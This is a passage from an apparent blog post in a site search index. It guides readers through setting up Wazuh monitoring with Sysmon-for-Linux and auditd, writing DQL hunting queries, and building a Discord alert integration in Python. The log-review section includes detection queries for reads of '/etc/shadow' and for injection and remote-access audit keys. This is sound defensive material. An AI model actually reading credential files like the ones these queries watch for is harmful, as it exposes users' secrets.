\"$url\"\ndone\n\nsha256sums='\nca8a78c13ade0acc6778c9ed100e4ca5e073403ba6ad208d44f69b5bdbcfe222\n0ed99f58c051fe5d042bb934988ca1914e89d66fd91653ff607eb50987f1f2e8\n34b07aa25e37c65d968f90b667ca38514f27a7c7fac93a277ef5a332877aa4ce\n'\n\nfor hash_value in $sha256sums\ndo\n    sha256sum ./*.xml | grep -P \"\\b$hash_value\\b\" || echo \"[WARNING]checksum error.\"\ndone\n\n# Necessary decoder and rule files\ncat decoder-linux-sysmon.xml | sudo tee -a /var/ossec/etc/decoders/local_decoder.xml &gt;/dev/null\ncat 200150-sysmon_for_linux_rules.xml | sudo tee -a /var/ossec/etc/rules/local_rules.xml &gt;/dev/null\n\n# If you want the same sysmon config running on the Wazuh server\nsudo sysmon -c ./sysmonforlinux-config.xml\n\nsystemctl restart wazuh-manager\n</code></pre></p> <p>\ud83d\udcdd Explanation</p> <p>1. ENDPOINT: Install <code>sysmonforlinx</code> + this config.xml)</p> <ul> <li>This config.xml works well with Wazuh, as it uses exclude rules to \"see\" everything, allowing Wazuh full visibility, while preventing Wazuh agent operations from flooding the logs</li> <li>You will likely need at least the ProcessCreate filters from this file if you plan to use your own config, to prevent your logs from being overrun</li> <li><code>ca8a78c13ade0acc6778c9ed100e4ca5e073403ba6ad208d44f69b5bdbcfe222  sysmonforlinux-config.xml</code></li> </ul> <p>2. WAZUH NODE: Install the decoder file so Wazuh can \\\"read\\\" Sysmon logs</p> <ul> <li>The Wazuh blog and socfortress GitHub contain the exact same decoder file, the blog's copy just has CRLF line endings.</li> <li><code>0ed99f58c051fe5d042bb934988ca1914e89d66fd91653ff607eb50987f1f2e8  decoder-linux-sysmon.xml</code></li> <li><code>cat decoder-linux-sysmon.xml | sudo tee -a /var/ossec/etc/decoders/local_decoder.xml &gt;/dev/null</code></li> </ul> <p>3. WAZUH NODE: Next you need the rule file, so Wazuh understands Sysmon event IDs in a general sense.</p> <ul> <li>Similar to the decoder file, the blog vs socfortress source file for Wazuh rules are virtuall the same (explore the diff in VSCode) just some lines swapped, and one bottom section added</li> <li><code>34b07aa25e37c65d968f90b667ca38514f27a7c7fac93a277ef5a332877aa4ce  200150-sysmon_for_linux_rules.xml</code></li> <li><code>cat 200150-sysmon_for_linux_rules.xml | sudo tee -a /var/ossec/etc/rules/local_rules.xml &gt;/dev/null</code></li> </ul> <p>This can seem confusing with three separate files for one monitoring scenario, so to reiterate:</p> <ul> <li>Each endpoint has it's own logging config, whether this is auditd rules, or Sysmon config.xml, maintain those how you have been (the Sysmon config from the blog is recommneded if you're just starting)</li> <li>Wazuh needs a decoder written to interpret any logs, it includes some by default but I've found in many cases you need a custom decoder to work with existing audit.rules and sysmon config.xml files</li> <li>The Wazuh rules file, tells Wazuh what and how to alert<ul> <li>The SOCFortress Wazuh rules file above can \"see\" every event your agent ships to Wazuh, and sets each event ID to <code>level=3</code> by default, so they will ALL appear in your Wazuh dashboard logs</li> <li>This is how you start from scratch, tune from here</li> <li>Build more specific changes over time as necessary, this can be to your sysmon config.xml, the Wazuh rules, or even just learning how to write good DQL queries for your environment</li> </ul> </li> </ul> <p>On Rule Writing</p> <p>The blog post writes / appends unique detections for the sysjoker malware to the <code>/var/ossec/etc/rules/local_rules.xml</code> on the Wazuh manager's end. This is a fairly advanced and complex route to take. You do not need to write rules this way as mentioned above just to get started. Trying to start this way is overwhelming, remember, the goal instead is to use the SOCFortress rules / decoder files to get all of your existing audit.rules and sysmon config.xml data into visible logs on Wazuh's dashboard while keeping them maintainable.</p>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#auditd","title":"auditd","text":"<p>You will again need three components:</p> <ul> <li>\ud83c\udf10 Decoder file (for Wazuh server)<ul> <li><code>2a37823495de90ccb54181e4b853e35bafed074a0e464666ec186c79826387ac  auditd_decoders.xml</code></li> </ul> </li> <li>\ud83c\udf10 Rules file (for Wazuh server)<ul> <li><code>3514afbc4fd081318aeea971065e54fc067c6e5243f835a44b6a1aba98680d8e  200110-auditd.xml</code></li> </ul> </li> <li>Auditd Configuration (for Endpoint)<ul> <li>\ud83c\udf10 github/Neo23x0/auditd</li> <li>\ud83c\udf10 github/straysheep-dev/auditd (my fork)</li> <li>\ud83c\udf10 github/socfortress/Wazuh-Rule (SOCFortress fork)</li> </ul> </li> </ul> <p>All of these things will work fine out of the box.</p> <p>Auditd Keys</p> <p>The most useful component to reviewing your logs after applying these changes is making sure all of your rules have keys (<code>man audit.rules</code>) associated with them. Even without a specific Wazuh rule for each key, the SOCFortress decoder file allows you to visualize and search logs based on the key you've asigned each rule in your own audit.rules file(s).</p> <p>Endpoint:</p> <p>Use whatever means of deploying <code>auditd</code> itself and a configuration. Regardless of which way you do this, this line should be included somewhere in your auditd configuration to filter out the Wazuh agent's behavior which could flood the logs. You could even write this to it's own <code>40-wazuh.rules</code> file:</p> <pre><code>## Ignore Wazuh endpoint agent\n-a always,exclude -F gid=wazuh  # from SocFortress config: https://github.com/socfortress/Wazuh-Rules/tree/main/Auditd\n</code></pre> <p>Unlike sysmonforlinux, auditd writes to its own log files. You will need to configure the agent to ingest these:</p> <pre><code>echo '\n&lt;ossec_config&gt;\n  &lt;localfile&gt;\n    &lt;log_format&gt;audit&lt;/log_format&gt;\n    &lt;location&gt;/var/log/audit/audit.log&lt;/location&gt;\n  &lt;/localfile&gt;\n&lt;/ossec_config&gt;\n' | sudo tee -a /var/ossec/etc/ossec.conf\n\nsudo systemctl restart wazuh-agent\n</code></pre> <p>Server-side:</p> <pre><code>cd ~/src\nurl_list='\nhttps://raw.githubusercontent.com/socfortress/Wazuh-Rules/main/Auditd/auditd_decoders.xml\nhttps://raw.githubusercontent.com/socfortress/Wazuh-Rules/main/Auditd/200110-auditd.xml\n'\nfor url in $url_list\ndo\n    curl -LfO \"$url\"\ndone\n\nsha256sums='\n2a37823495de90ccb54181e4b853e35bafed074a0e464666ec186c79826387ac\n3514afbc4fd081318aeea971065e54fc067c6e5243f835a44b6a1aba98680d8e\n'\n\nfor hash_value in $sha256sums\ndo\n    sha256sum ./*.xml | grep -P \"\\b$hash_value\\b\" || echo \"[WARNING]checksum error.\"\ndone\n\n# Necessary decoder and rule files\ncat auditd_decoders.xml | sudo tee -a /var/ossec/etc/decoders/local_decoder.xml &gt;/dev/null\ncat 200110-auditd.xml | sudo tee -a /var/ossec/etc/rules/local_rules.xml &gt;/dev/null\n\n#systemctl restart wazuh-manager\n</code></pre> <p>Finally, you'll need to exclude Wazuh's built-in auditd decoders and rules by adding the following lines:</p> <ul> <li><code>&lt;decoder_exclude&gt;ruleset/decoders/0040-auditd_decoders.xml&lt;/decoder_exclude&gt;</code></li> <li><code>&lt;rule_exclude&gt;0365-auditd_rules.xml&lt;/rule_exclude&gt;</code></li> </ul> <p>To <code>/var/ossec/etc/ossec.conf</code>:</p> <pre><code>&lt;SNIP&gt;\n  &lt;ruleset&gt;\n    &lt;!-- Default ruleset --&gt;\n    &lt;decoder_dir&gt;ruleset/decoders&lt;/decoder_dir&gt;\n    &lt;decoder_exclude&gt;ruleset/decoders/0040-auditd_decoders.xml&lt;/decoder_exclude&gt;\n    &lt;rule_dir&gt;ruleset/rules&lt;/rule_dir&gt;\n    &lt;rule_exclude&gt;0215-policy_rules.xml&lt;/rule_exclude&gt;\n    &lt;rule_exclude&gt;0365-auditd_rules.xml&lt;/rule_exclude&gt;\n&lt;SNIP&gt;\n</code></pre>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#zeek","title":"Zeek","text":"<p>Documentation already exists for setting up and ingesting logs from Suricata on each endpoint.</p> <p>This section details doing the same using Zeek.</p> <p>\u26a0\ufe0f TO DO: This section is still under construction, check back later! \u26a0\ufe0f</p>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#customizing-rules","title":"Customizing Rules","text":"<p>By default you'll find even the SOC Fortress rules are not alerting on all of your auditd rules in Wazuh's dashboard, even if they're getting logged by auditd.</p> <p>This section is an example showing you how to write your own rule block to integrate with those rules specifically, but could apply to any ruleset. In this case, assume you installed all of the default rules plus the STIG profile that ships with auditd.</p> <p>First obtain all active auditd keys from the endpoint:</p> <pre><code>audit_rules=$(sudo cat /etc/audit/audit.rules)\necho \"$audit_rules\" | awk '{print $NF}' | sed 's/key=//g' | sort | uniq\n</code></pre> <p>Use <code>type=pcre2</code> when writing the rules with numerous keys to match on, to be able to include them all in the same line. You'll see SOC Fortress is using their own decoders and parent rules to process log entries that are generally syscall, execve, path-related, etc. Here <code>if_sid 200110</code> is being used as the \"parent\" rule for subsequent rules that generally result in logs related to syscall events.</p> <p>We'll also use <code>200110</code> below here to process all matches as syscalls. Ideally you would go through each key to determine what event types the majority of them result in, so groups of keys have their own processing block. If you try to simply duplicate this entire block for each decoder type, it appears to operate on a first match in the <code>local_rules.xml</code>, so only the first decoder will process the log if a matching key is in both blocks.</p> <p>Add this to the bottom of <code>/var/ossec/etc/rules/local_rules.xml</code>, just above the <code>&lt;/group&gt;</code> closing tag, on your Wazuh server (not the endpoints):</p> <pre><code>  &lt;rule id=\"300001\" level=\"12\"&gt;\n  &lt;if_sid&gt;200110&lt;/if_sid&gt;\n  &lt;field type=\"pcre2\" name=\"audit.key\"&gt;(actions|identity|32bit-abi|MAC-policy|access|code-injection|data-injection|delete|export|external-access|maybe-escalation|module-load|module-unload|perm_mod|register-injection|system-locale|time-change|tracing)&lt;/field&gt;\n  &lt;description&gt;Detects all keys mapped to the default + STIG rules that ship with auditd.&lt;/description&gt;\n  &lt;group&gt;syscall,stig,&lt;/group&gt;\n  &lt;/rule&gt;\n\n&lt;/group&gt;\n</code></pre>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#reviewing-logs","title":"Reviewing Logs","text":"<p>Now that data is coming in to your Wazuh dashboard, how do you sort through it?</p>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#general","title":"General","text":"<p>No matter what you're searching for, filtering based on a minimum severity level is incredibly powerful:</p> <pre><code>&lt;SNIP&gt; AND rule.level &gt; 3\n</code></pre> <p></p> <p>This is a quick reference for modules built in to Wazuh that you can keep in mind when thinking of \"what\" Wazuh has that you may want to search for.</p> <p>These three groups are also built in components to Wazuh. They use the agent to perform premade checks and generate the logs. All three need to be configured (in other words enabled) to start generating logs, as detailed below.</p> <ul> <li><code>rule.groups:rootcheck</code> Display rootkit-check logs<ul> <li>Add the <code>full_log</code> field in your columns</li> <li>\ud83c\udf10 change the <code>&lt;freqency&gt;</code> of the check in each endpoint's /var/ossec/etc/ossec.conf</li> </ul> </li> <li><code>rule.groups:syscheck</code> Display file integrity events<ul> <li>You'll need to enable <code>check_all=\"yes\" report_changes=\"yes\" realtime=\"yes\"</code> on each endpoint</li> <li>Functions similar to AIDE but in real time</li> </ul> </li> <li><code>rule.groups:suricata</code> Logs related to suricata NSM<ul> <li>\ud83c\udf10 suricata needs to be installed and configured on each enpoint</li> </ul> </li> </ul> <p>Use the DQL search bar when viewing an agent's events to search for <code>rule.groups:rootcheck</code> or <code>rule.groups:suricata</code>.</p> <p></p>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#sysmon_1","title":"Sysmon","text":"<p>If you're using Wazuh's own default \"collect most everything\" Sysmon config, you could start by filtering out some noise:</p> <pre><code>(NOT data.system.eventId:5 AND NOT data.eventdata.image:/usr/bin/dash)\n</code></pre> <p>Look for failed login, auth, or escalation attempts:</p> <pre><code>(NOT data.system.eventId:5 AND NOT data.eventdata.image:/usr/bin/dash) AND location:/var/log/auth.log AND rule.description:*ailed*\n</code></pre> <p>Look for <code>sudo</code> usage:</p> <ul> <li>Add <code>data.eventdata.commandLine</code> to your columns</li> </ul> <pre><code>(data.eventdata.commandLine:*sudo*)\n</code></pre> <p>Using <code>Event ID 3: Network connection</code>, add the following fields to the visible columns:</p> <ul> <li><code>data.eventdata.destinationHostname</code></li> <li><code>data.eventdata.DestinationIp</code></li> <li><code>data.eventdata.destinationPort</code></li> </ul> <p>Using what you know about the system, slowly eliminate common binaries used for networking based on what you see in the logs, such as the DNS daemon, tailscaled, apt, NetworkManger, snapd, and so on.</p> <pre><code>(data.system.eventId:3)\n(data.system.eventId:3 AND NOT data.eventdata.image:/usr/sbin/unbound)\n(data.system.eventId:3 AND NOT data.eventdata.image:/usr/sbin/unbound AND NOT data.eventdata.image:/usr/sbin/tailscaled)\n\n&lt;SNIP&gt;\n\n(data.system.eventId:3 AND NOT data.eventdata.image:/usr/sbin/unbound AND NOT data.eventdata.image:/usr/sbin/tailscaled AND NOT data.eventdata.image:*NetworkManager AND NOT data.eventdata.image:/usr/lib/apt/methods/http AND NOT data.eventdata.image:/usr/lib/snapd/snapd)\n</code></pre> <p>Look for weird destination ports from common network processes:</p> <ul> <li>Unbound should only contact certain destination addresses</li> <li>It should only reach them on ports tcp/853 or udp+tcp/53</li> </ul> <pre><code>(data.system.eventId:3 AND data.eventdata.image:/usr/sbin/unbound AND NOT data.eventdata.destinationPort:853 AND NOT data.eventdata.destinationPort:53)\n</code></pre> <p></p> <p>See what external hosts tailscaled is talking to and how often:</p> <pre><code>(data.system.eventId:3 AND data.eventdata.image:*tailscaled AND NOT data.eventdata.DestinationIp:0.0.0.0 AND NOT data.eventdata.DestinationIp:100.* AND NOT data.eventdata.DestinationIp:127.* AND NOT data.eventdata.DestinationIp:10.* AND NOT data.eventdata.DestinationIp:192.168.*)\n</code></pre> <p>Network Analysis and Anomaly Detection</p> <p>Digging into the network activity is where you'll find things like beacons, and can potentially get this data into a pcap and pass it off to RITA for a deeper analysis.</p> <p>If you walked through the queries in this section, you already can see where to get ideas for additional queries. The real trick is learning when you're digging too deep, and need to pivot to something else. This can be augmented by external alerting on special events, or even simply building really good queries tailored to your environment.</p>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#auditd_1","title":"auditd","text":"<p>You'll notice if your events page has the default columns (<code>Time</code>, <code>rule.description</code>, <code>rule.level</code>, and <code>rule.id</code>) You'll need to discern auditd log events by their type, such as SYSCALL, EXECVE, and so on.</p> <p>It's helpful to add the following columns to your data display:</p> <ul> <li><code>data.audit.exe</code></li> <li><code>data.audit.key</code></li> </ul> <p>So you can visualize what's being executed, and what key it relates to. The <code>full_log</code> field is way too large to show here, but with this information you can decide what to focus on while scrolling. You won't always turn up everything with a well crafted DQL query. This is important to remember, always try multiple methods to visualize and look for gaps.</p> <p>Easily sort through your logs for keys like this:</p> <pre><code>\"data.audit.key\": \"T1033_System_User_Discovery\"\n\"data.audit.key\": \"T1219_Remote_Access_Software\"\n</code></pre> <p>Or by any string appearing in an audit log field (notice sometimes quotes work, and other times they don't):</p> <pre><code>\"full_log\": \"*/etc/shadow*\"\n\"data.audit.exe\":*gdb*\n\"data.audit.exe\":*python* AND data.auditd.key:network_connect_4\n</code></pre> <p></p> <p>Interestingly this trick does not work as you'd expect:</p> <pre><code>\"full_log\": \"*://*\"\n</code></pre> <p>If you have a key logging the <code>connect</code> syscall, you could instead try:</p> <pre><code>data.audit.key:network_connect_4 OR data.audit.key:network_connect_6\n</code></pre> <p>Interestingly, even if <code>auditd</code> is set to enrich logs on the endpoint, Wazuh still receives the encoded entries. This means you'll get entries like:</p> <pre><code>proctitle=746F756368002F7661722F6C6F672F61756469742F746D705F6469726563746F7279312F6D616C776172652E7079\n</code></pre> <p>To decode them, you'll need to use <code>xxd</code>. Credit to Hal Pomeranz for showing the full <code>tr</code> command as well during WWHF.</p> <pre><code>\u2514\u2500$ echo '746F756368002F7661722F6C6F672F61756469742F746D705F6469726563746F7279312F6D616C776172652E7079' | xxd -r -p | tr \\\\000 ' '; echo\ntouch /var/log/audit/tmp_directory1/malware.py\n</code></pre>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#data-visualization","title":"Data Visualization","text":"<p>On the left of the events are all of the fields available to search. Clicking on one reveals these are being tracked and graphed.</p> <p>To see a graph of all logs based on keys, click <code>Visualize</code> (and delete any DQL query from the serch bar) to see all logs sorted by keys.</p> <p>Changing the X and Y Axes</p> <p>It may be easier to read by going to \"Metrics &amp; axes\", and changing the X-axes to LEFT, then Y-axes to TOP, and clicking <code>&gt; Update</code> so you can read the key names on the LEFT.*</p> <p></p>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#external-alerting","title":"External Alerting","text":"<p>External alerting can be incredibly useful. Defining events of the highest severity to be alerted over an email, text, or some external channel like Slack or Discord can give you the heads up necessary to respond instead of react during an incident.</p> <p>Wazuh Custom Integrations</p> <p>This section looks at the custom integration of third-party APIs, and their source code, to port the Slack integration to Discord. Examples of this already exist.</p> <p>It should also be noted, prior to publishing this post, an official integration has begun, see the pull-request here! \ud83c\udf89</p> <p>These make great points of reference to build and revise your own integration. However this port does a few things differently.</p> <ul> <li>Uses the existing slack.py <code>generate_msg</code> function's code formatting with conditional fields</li> <li>Adds conditional fields that will be included with certain Sysmon events</li> <li>Includes the optional <code>filter_msg</code> function from shuffle.py to filter events if their rule ID matches any in <code>SKIP_RULE_IDS</code></li> <li>Use conditional variables to handle arbitrary JSON structures</li> </ul> <p></p> <p>\ud83d\udea9 Getting Started</p> <p>We need a python script that doesn't exist yet to perform the actions. This is where referencing the other integrations will save a huge amount of time, and keep things consistent. This part can be overlooked if you haven't read this post before getting started.</p> <p>All of the requirements in a list next to each other, will make this easier to understand.</p> <ol> <li>We need a python script to generate and send the alert</li> <li>For Discord, of all the existing integrations, slack.py is the closest starting point since they both use webhooks and similar data</li> <li>These scripts can be narrow in scope in what they send, however we want a generic script that can be used for ANY type of alert<ul> <li>General Wazuh logs and alerts, like rootkit detection and other module logs</li> <li>Syslog, auditd</li> <li>Sysmon, sysmonforlinux</li> </ul> </li> <li>With this in mind, controlling when the script executes will primarily happen in the <code>&lt;integration&gt;</code> section of <code>/var/ossec/etc/ossec.conf</code><ul> <li>Alert on events of a certain severity <code>&lt;level&gt;</code></li> <li>Alert on a <code>&lt;group&gt;</code> filter (can be multiple, comma separated)</li> <li>Alert on a <code>&lt;rule_id&gt;</code> filter (can be multiple, comma separated)</li> <li>Alert on an <code>&lt;event_location&gt;</code> filter (can be multiple, comma separated)</li> </ul> </li> <li>Integrations live under <code>/var/ossec/integrations</code> as two files:<ul> <li><code>custom-discord</code> Every integration has this shell script, it's the same script for each integration, only the file name changes</li> <li><code>custom-discord.py</code> The python script to create and send the alert to a platform of our choice (Discord)</li> <li>Any custom integration must have a name beginning with \"custom-\"</li> </ul> </li> </ol> <p>Maintainability</p> <p>Ultimately, this will give use something expandable that we don't need to constantly rewrite, because it can ingest multiple log and alert types. Thinking back to how ingesting logs requires three components (the logging conf like sysmon.xml or auditd.rules, a wazuh decoder, and a wazuh rule file), we want to only have to maintain the minumum number of pieces everywhere.</p>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#python-script","title":"Python Script","text":"<p>From the existing slack.py script, the majority of changes we'll need to make are in the <code>generate_msg()</code> function. We have a few options of how to do this, two of the best are either in plain text using content <code>{'content': '&lt;data&gt;'}</code>, or with embeds <code>{\"embeds\": [&lt;data&gt;]}\"</code> to generate a rich content message.</p> <p>\ud83e\udeba Discord Embeds</p> <ul> <li>\ud83c\udf10 Discord intro to webhooks</li> <li>\ud83c\udf10 Discord webhook / embed usage</li> <li>\ud83c\udf10 Discord embed object structure</li> <li>\ud83c\udf10 Discord embed field structure</li> </ul> <p>The structure of an embed is <code>{\"embed\": [data]}</code>, where in our case <code>data</code> is a JSON structured dictionary.</p> <ul> <li>\ud83c\udf10 slack.py creates this structure already in <code>generate_msg</code> using <code>msg = {}</code></li> <li>We can reuse the list of <code>msg['fields']</code> by changing the keys (<code>'title':</code> becomes <code>'name':</code>, also add a key for <code>'inline':</code>)</li> <li>Finally update the object sent to the return value to be <code>{'embeds': [msg]}</code> instead of <code>{'attachments': [msg]}</code></li> </ul> <p>Knowing the available fields in an embed, we can update any other variables to match what Discord is expecting.</p> <p>The start of our msg object will look like this:</p> Slack VersionDiscord Version <pre><code>&lt;SNIP&gt;\n    msg = {}\n    msg['color'] = color\n    msg['pretext'] = 'WAZUH Alert'\n    msg['title'] = alert['rule']['description'] if 'description' in alert['rule'] else 'N/A'\n    msg['text'] = alert.get('full_log')\n\n    msg['fields'] = []\n&lt;SNIP&gt;\n</code></pre> <pre><code>&lt;SNIP&gt;\n    msg = {}\n    msg['type'] = 'rich' # Discord specific, default type for embeds\n    msg['color'] = color\n    msg['title'] = 'WAZUH Alert'\n    msg['description'] = description\n\n    msg['fields'] = []\n&lt;SNIP&gt;\n</code></pre> <p>\ud83d\udfe3 Discord Colors</p> <p>Discord colors take the decimal value of the color's hex code. You can Google a color's hex code, open a calculator app in programming mode, set it to HEX mode, and paste the hex value. Change it to DEC mode to get the decimal representation of that hex code. That is the value to use here.</p> <p>Here's an example of the color severity section.</p> Discord Version <pre><code>&lt;SNIP&gt;\n    if severity &lt;= 4:\n        color = '255'      # blue, hex value is #0000FF\n    elif severity &gt;= 5 and severity &lt;= 7:\n        color = '16776960' # yellow, hex value is #FFFF00\n    else:\n        color = '16711680' # red, hex value is #FF0000\n&lt;SNIP&gt;\n</code></pre> <p>\u2699\ufe0f Conditional Variables</p> <p>As mentioned previously, the modularity comes from the conditional values in this script. The slack.py version has an example that's incredibly similar to Ansible's <code>when:</code> conditional statements. This is how python works. Knowing this, we can create fail-safe variables to check if:</p> <ul> <li>A full \"path\" of key:value pairs is available</li> <li>If not, then if another (default) \"path\" of key:value pairs is available</li> <li>Else, 'N/A' (in some cases this is omitted since there will always be a value)</li> </ul> <p>Building from the Slack version's example, we can create variables for basically every field we would want to add to an alert.</p> Slack VersionDiscord Version <pre><code>&lt;SNIP&gt;\nmsg['title'] = alert['rule']['description'] if 'description' in alert['rule'] else 'N/A'\n&lt;SNIP&gt;\n</code></pre> <pre><code>&lt;SNIP&gt;\ntimestamp = alert['timestamp'] if 'timestamp' in alert else 'N/A'\nseverity = alert['rule']['level']\ndescription = alert['rule']['description'] if 'description' in alert['rule'] else 'N/A'\nagent_id = alert['agent']['id'] if 'id' in alert['agent'] else 'N/A'\nagent_name = alert['agent']['name'] if 'name' in alert['agent'] else 'N/A'\nrule_id = alert['rule']['id'] if 'id' in alert['rule'] else 'N/A'\nlocation = alert['location']\ndest_ip = alert['data']['eventdata']['DestinationIp'] if 'data' in alert and 'eventdata' in alert['data'] and 'DestinationIp' in alert['data']['eventdata'] else 'N/A'\ndest_port = alert['data']['eventdata']['destinationPort'] if 'data' in alert and 'eventdata' in alert['data'] and 'destinationPort' in alert['data']['eventdata'] else 'N/A'\ndest_host = alert['data']['eventdata']['destinationHostname'] if 'data' in alert and 'eventdata' in alert['data'] and 'destinationHostname' in alert['data']['eventdata'] else 'N/A'\nsrc_ip = alert['data']['eventdata']['sourceIp'] if 'data' in alert and 'eventdata' in alert['data'] and 'sourceIp' in alert['data']['eventdata'] else 'N/A'\nsrc_port = alert['data']['eventdata']['sourcePort'] if 'data' in alert and 'eventdata' in alert['data'] and 'sourcePort' in alert['data']['eventdata'] else 'N/A'\nfull_log = alert['full_log'] if 'full_log' in alert else 'N/A'\nwin_message = alert['data']['win']['system']['message'] if 'data' in alert and 'win' in alert['data'] and 'system' in alert['data']['win'] and 'message' in alert['data']['win']['system'] else 'N/A'\nlog_id = alert['id']\n&lt;SNIP&gt;\n</code></pre> <p>\ud83d\udee0\ufe0f Conditional Fields</p> <p>Finally, we can copy what slack.py already does to build additional conditional fields.</p> Slack VersionDiscord Version <pre><code>&lt;SNIP&gt;\nif 'agentless' in alert:\n        msg['fields'].append(\n            {\n                'title': 'Agentless Host',\n                'value': alert['agentless']['host'],\n            }\n        )\n&lt;SNIP&gt;\n</code></pre> <pre><code>&lt;SNIP&gt;\nmsg['fields'] = []\n# The 'if' statements wrapping certain fields determine if a field exists in the log data, and if not, that\n# field will be absent entirely in the embed rather than an empty field.\n# Discord embeds can include up to 25 fields. 'inline' means it will attempt to put neighboring fields into one line,\n# up to three per row.\nmsg['fields'].append(\n    {\n        'name': 'Timestamp',\n        'value': '{0}'.format(timestamp),\n        'inline': False\n    }\n)\nif 'agent' in alert:\n    msg['fields'].append(\n        {\n            'name': 'Agent',\n            'value': '({0}) - {1}'.format(agent_id, agent_name),\n            'inline': True\n        }\n    )\nif 'agentless' in alert:\n    msg['fields'].append(\n        {\n            'name': 'Agentless Host',\n            'value': '{0}'.format(agentless),\n            'inline': True\n        }\n    )\nmsg['fields'].append(\n    {\n        'name': 'Location',\n        'value': '{0}'.format(location),\n        'inline': True\n    }\n)\nmsg['fields'].append(\n    {\n        'name': 'Rule ID',\n        'value': '{0} _(Level {1})_'.format(rule_id, severity),\n        'inline': True\n    }\n)\n# The remaining fields have been formatted with a code block using one ` or three ``` backticks to prevent malicious strings from potentially\n# making network requests or being clickable\nif 'data' in alert and 'eventdata' in alert['data'] and 'DestinationIp' in alert['data']['eventdata']:\n    msg['fields'].append(\n        {\n            'name': 'Dest IP',\n            'value': '`{0}`'.format(dest_ip),\n            'inline': True\n        }\n    )\nif 'data' in alert and 'eventdata' in alert['data'] and 'destinationPort' in alert['data']['eventdata']:\n    msg['fields'].append(\n        {\n            'name': 'Dest Port',\n            'value': '`{0}`'.format(dest_port),\n            'inline': True\n        }\n    )\nif 'data' in alert and 'eventdata' in alert['data'] and 'destinationHostname' in alert['data']['eventdata']:\n    msg['fields'].append(\n        {\n            'name': 'Dest Host',\n            'value': '`{0}`'.format(dest_host),\n            'inline': True\n        }\n    )\nif 'data' in alert and 'eventdata' in alert['data'] and 'sourceIp' in alert['data']['eventdata']:\n    msg['fields'].append(\n        {\n            'name': 'Source IP',\n            'value': '`{0}`'.format(src_ip),\n            'inline': True\n        }\n    )\nif 'data' in alert and 'eventdata' in alert['data'] and 'sourcePort' in alert['data']['eventdata']:\n    msg['fields'].append(\n        {\n            'name': 'Source Port',\n            'value': '`{0}`'.format(src_port),\n            'inline': True\n        }\n    )\nif 'full_log' in alert:\n    msg['fields'].append(\n        {\n            'name': 'Full Log',\n            'value': '```{0}```'.format(full_log),\n            'inline': False\n        }\n    )\nif 'data' in alert and 'win' in alert['data'] and 'system' in alert['data']['win'] and 'message' in alert['data']['win']['system']:\n    msg['fields'].append(\n        {\n            'name': 'Message',\n            'value': '```{0}```'.format(win_message),\n            'inline': False\n        }\n    )\nmsg['fields'].append(\n    {\n        'name': 'Wazuh ID',\n        'value': '{0}'.format(log_id),\n        'inline': False\n    }\n)\n&lt;SNIP&gt;\n</code></pre> <p>Discord Char Length Limitations</p> <p>If you look at the integrations/discord.py pull request, you'll notice <code>full_log</code> is under the <code>['description']</code> field of the Discord embed data. This is due to Discord's description field having a higher character limit (4096) than the <code>fields.value</code> field (1024). This will cause logs longer than 1024 chars to be dropped and never shipped to Discord!</p> <p>In both cases you could ensure a limit on the field content with something like this:</p> <pre><code>'value': '```{0}```'.format(full_log[:4096]),\n</code></pre> <p>Here the char limit for <code>description</code> is set so alerts are trimmed and not dropped.</p> <p>\ud83e\uddea Filtering Rule ID's</p> <p>This is optional and can exist as a list baked in to the script.</p> <pre><code>&lt;SNIP&gt;\n# Rule filter\n# This is just one additional place to fine tune what alerts are posted\nSKIP_RULE_IDS = [\n    '00000',\n]\n&lt;SNIP&gt;\n</code></pre> <p>\ud83d\udcdc Completed Script</p> <p>The full script is available here.</p> Accessing Nested Keys with <code>get(key, default=None)</code> <p>Asking Google or ChatGPT what's the best way to access a nested dictionary in python, you'll find some examples of the <code>.get()</code> method. This essentially does the same thing in a less verbose way.</p> <ul> <li>Traverses the dictionaries, returning the value for <code>key</code>, if it exists</li> <li>Avoids the <code>KeyError</code> without requiring a check, when a subsequent key does not exist within the data</li> </ul> <pre><code>severity = alert.get('rule', {}).get('level') if alert.get('rule', {}).get('level') is not None else alert.get('_source', {}).get('rule', {}).get('level', 'N/A')\n</code></pre> <p>This was included for future reference, but the \"if\" \"else\" style was used to match the style and readability of the original slack.py script.</p> <p>References:</p> <ul> <li>\ud83c\udf10 Accessing nested keys</li> <li>\ud83c\udf10 Traversing varied dictionary structures with <code>.get()</code></li> <li>\ud83c\udf10 Using <code>dict.get('key')</code></li> <li>\ud83c\udf10 Python Docs: <code>.get()</code> method</li> <li>\ud83c\udf10 Python <code>None</code> test</li> </ul> <p>\ud83d\udcdd Content</p> <p>Ai Usage</p> <p>ChatGPT helped debug the <code>str()</code> and trailing <code>+</code> to correctly format this block to appear how it looks below.</p> <p>If you prefer not to use the <code>embed</code> object, this is an example using the same variables, but replacing the main block in <code>generate_msg</code> to send the plaintext <code>content</code> parameter of up to 2000 characters:</p> <pre><code>def generate_msg(alert: any, options: any) -&gt; str:\n\n&lt;SNIP&gt;\n\n    # To ensure formatting, each line must have a trailing `+` until the final line\n    # Each variable must also be concatenated as a str() individually, instead of `'content': str(...)`\n    msg = {\n        'content': (\n            \"=====[ Wazuh Alert ]=====\" + \"\\n\" +\n            \"- Timestamp: \" + str(timestamp) + \"\\n\" +\n            \"- Log ID: \" + str(log_id) + \"\\n\" +\n            \"- Agent ID: \" + str(agent_id) + \"\\n\" +\n            \"- Agent Name: \" + str(agent_name) + \"\\n\" +\n            \"- Severity: \" + str(severity) + \"\\n\" +\n            \"- Rule ID: \" + str(rule_id) + \"\\n\" +\n            \"- Description: \" + str(description) + \"\\n\" +\n            \"- Dest IP: \" + str(dest_ip) + \"\\n\" +\n            \"- Dest Port: \" + str(dest_port) + \"\\n\" +\n            \"- Dest Host: \" + str(dest_host) + \"\\n\" +\n            \"- Full Log: \" + str(full_log) + \"\\n\"\n        )\n    }\n\n    if options:\n        